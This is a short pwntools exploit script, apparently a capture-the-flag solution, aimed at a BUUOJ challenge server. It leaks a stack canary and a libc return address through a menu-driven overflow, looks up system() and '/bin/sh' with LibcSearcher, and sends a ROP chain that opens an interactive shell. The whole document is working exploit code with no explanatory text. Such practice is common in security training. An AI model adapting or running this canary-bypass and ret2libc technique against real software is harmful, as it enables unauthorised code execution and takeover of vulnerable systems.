from pwn import *
from LibcSearcher import *
context(arch='amd64', log_level='debug')
# io = process('./pwn')
io = remote('node4.buuoj.cn', 29017)
def Input(content):
    io.sendafter(b'>> ', b'1'.ljust(0x20, b' '))
    io.send(content)
def Output():
    io.sendafter(b'>> ', b'2'.ljust(0x20, b' '))
Input(cyclic(0x89))
Output()
io.recv(0x88)
canary = u64(io.recv(8))
canary &= 0xFFFFFFFFFFFFFF00
print(hex(canary))

payload = cyclic(0x90)
payload += p64(0xdeadbeefdeadbeef)
Input(payload)
Output()
io.recv(0x98)
retaddr = u64(io.recv(6) + b'\x00\x00')
print(hex(retaddr))
libc_start_main = retaddr - 240
libc = LibcSearcher('__libc_start_main', libc_start_main)
base = libc_start_main - libc.dump('__libc_start_main')
sys = base + libc.dump('system')
binsh = base + libc.dump('str_bin_sh')

payload = cyclic(0x88)
payload += p64(canary)
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0x400A93)
payload += p64(binsh)
payload += p64(sys)
Input(payload)
io.sendafter(b'>> ', b'3'.ljust(0x20, b' '))
io.interactive()